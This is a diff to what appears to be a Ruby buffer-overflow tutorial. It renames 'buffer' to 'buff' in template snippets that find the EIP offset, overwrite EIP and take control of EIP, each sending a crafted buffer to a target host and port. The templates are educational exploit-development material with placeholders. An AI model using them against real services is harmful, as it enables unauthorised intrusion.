@@ -28,7 +28,7 @@ end
 ```Ruby
 require 'socket'
 
-buffer = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
+buff = #Based on at what bytes you get to EIP, generate your pattern and insert it here, example "AAAA"
 RHOST = #IP address of the target machine, example: "10.10.10.0"
 RPORT = #Port number of the target machine, example: 21
 
@@ -42,8 +42,8 @@ end
 ```    
 ### Overwriting EIP
 ```Ruby
-buffer = #Based on the offset bytes, place your pattern here 
-buffer += "B" * 4
+buff = #Based on the offset bytes, place your pattern here 
+buff += "B" * 4
 RHOST = #IP address of the target machine, example: "10.10.10.0"
 RPORT = #Port number of the target machine, example: 21
 
@@ -53,8 +53,8 @@ TCPSocket.open(RHOST,RPORT){ |s| s.puts buff + '\r\n'}
 ```
 ### Owning EIP
 ```Ruby
-buffer = "A" * (Offset Value)
-buffer += #Address of EIP
+buff = "A" * (Offset Value)
+buff += #Address of EIP
 RHOST = #IP address of the target machine, example: "10.10.10.0"
 RPORT = #Port number of the target machine, example: 21
 
